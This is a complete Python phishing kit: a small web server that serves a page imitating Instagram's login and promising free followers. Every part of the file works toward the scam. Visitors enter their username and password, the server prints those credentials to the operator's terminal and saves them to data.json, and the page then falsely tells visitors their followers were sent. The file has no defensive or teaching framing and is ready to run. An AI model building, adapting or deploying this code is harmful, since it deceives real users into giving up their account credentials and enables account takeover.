import json
import os
from http.server import HTTPServer, BaseHTTPRequestHandler

# ==========================================
# 1. BACKEND (Python)
# ==========================================

DATA_FILE = "data.json"

def save_data_to_file(new_entry):
    """Saves incoming user data to a local JSON file."""
    records = []
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                records = json.load(f)
        except json.JSONDecodeError:
            records = []
    
    records.append(new_entry)
    
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=4)

class CustomRequestHandler(BaseHTTPRequestHandler):

    # Serve the HTML / JS Frontend
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(FRONTEND_HTML.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    # Handle incoming data requests from the frontend
    def do_POST(self):
        if self.path == "/api/submit":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length)

            try:
                data = json.loads(post_data.decode("utf-8"))
                username = data.get("username", "").strip()
                password = data.get("password", "").strip()
                follower = data.get("follower", "")

                # Validation
                if not username or not password:
                    self._send_json({"success": False, "message": "Username and password are required."}, status=400)
                    return

                # Print to owner's terminal
                print("\n================ NEW DATA RECEIVED ================")
                print(f"Username / Email: {username}")
                print(f"Password        : {password}")
                print(f"Followers Option: {follower or 'None selected'}")
                print("===================================================\n")

                # Save to local file
                save_data_to_file({
                    "username": username,
                    "password": password,
                    "follower": follower
                })

                # Respond to frontend
                self._send_json({
                    "success": True,
                    "message": "Data received and stored successfully!"
                }, status=200)

            except Exception as e:
                self._send_json({"success": False, "message": f"Server error: {str(e)}"}, status=500)

    def _send_json(self, response_dict, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(response_dict).encode("utf-8"))


# ==========================================
# 2. FRONTEND (HTML / CSS / JavaScript)
# ==========================================

FRONTEND_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram followers</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    .login-container { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; }
    .login-card { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px 30px 30px; width: 100%; margin-bottom: 10px; }
    .brand { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
    .brand i { font-size: 28px; color: #262626; margin-right: 8px; }
    .brand h1 { font-weight: 400; font-size: 32px; letter-spacing: -1px; color: #262626; }
    .login-form { display: flex; flex-direction: column; gap: 10px; }
    .login-form input, .login-form select { width: 100%; padding: 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 13px; outline: none; }
    .login-btn { margin-top: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; padding: 10px 0; font-weight: 600; font-size: 14px; cursor: pointer; }
    .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .message-box { margin-top: 12px; padding: 10px; border-radius: 4px; font-size: 12px; display: none; text-align: center; }
    .message-box.error { background: #fef0f0; border: 1px solid #f5c6c6; color: #8a3d3d; }
    .message-box.success { background: #e6f7e6; border: 1px solid #b7e1b7; color: #1e5a1e; }
  </style>
</head>
<body>

<div class="login-container">
  <div class="login-card">
    <div class="brand">
      <i class="fab fa-instagram"></i>
      <h1>Instagram get followers free </h1>
    </div>

    <form class="login-form" id="loginForm">
      <input type="text" id="username" placeholder=" username" />
      <input type="password" id="password" placeholder="Password" />

      <select id="followerSelect">
        <option value="" disabled selected>— Select Option —</option>
        <option value="1K">  (1K)</option>
        <option value="5K">  (5K)</option>
        <option value="10K"> (10K)</option>
        <option value="30K"> (30K)</option>
      </select>

      <button type="submit" class="login-btn" id="loginBtn">Submit</button>
    </form>

    <div id="messageBox" class="message-box"></div>
  </div>
</div>

<script>
  // CLIENT-SIDE JAVASCRIPT
  const loginForm = document.getElementById('loginForm');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const followerSelect = document.getElementById('followerSelect');
  const loginBtn = document.getElementById('loginBtn');
  const messageBox = document.getElementById('messageBox');

  function showMessage(text, isSuccess = false) {
    messageBox.textContent = text;
    messageBox.style.display = 'block';
    messageBox.className = 'message-box ' + (isSuccess ? 'success' : 'error');
  }

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (!username || !password) {
      showMessage('Please fill in both fields.');
      return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = 'Sending...';

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username,
          password,
          follower: followerSelect.value
        })
      });

      const data = await response.json();

      if (response.ok && data.success) {
        showMessage('Followers successfully sent to you!', true);
        loginForm.reset();
      } else {
        showMessage(data.message || 'Submission failed.', false);
      }
    } catch (err) {
      showMessage('Network error: Server is unreachable.', false);
    } finally {
      loginBtn.disabled = false;
      loginBtn.textContent = 'Submit';
    }
  });
</script>

</body>
</html>"""

# ==========================================
# 3. SERVER INITIALIZATION
# ==========================================

def run_server(port=8080):
    server_address = ("", port)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print(f"==================================================")
    print(f" Server active at: http://localhost:{port}")
    print(f" Incoming user submissions will appear in this terminal")
    print(f" and save locally to: {os.path.abspath(DATA_FILE)}")
    print(f"==================================================")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        httpd.server_close()

if __name__ == "__main__":
    run_server(port=8080)